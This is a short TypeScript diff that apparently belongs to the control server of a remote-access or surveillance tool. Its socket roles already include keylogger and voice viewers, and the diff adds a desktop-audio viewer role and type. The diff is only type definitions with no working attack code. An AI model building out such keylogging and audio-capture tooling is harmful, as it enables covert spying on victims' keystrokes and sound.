@@ -11,6 +11,7 @@ export type SocketRole =
   | "notifications_viewer"
   | "keylogger_viewer"
   | "voice_viewer"
+  | "desktop_audio_viewer"
   | "dashboard_viewer"
   | "chat_viewer";
 
@@ -73,6 +74,13 @@ export type KeyloggerViewer = {
 };
 
 export type VoiceViewer = {
+  id: string;
+  clientId: string;
+  viewer: ServerWebSocket<SocketData>;
+  createdAt: number;
+};
+
+export type DesktopAudioViewer = {
   id: string;
   clientId: string;
   viewer: ServerWebSocket<SocketData>;
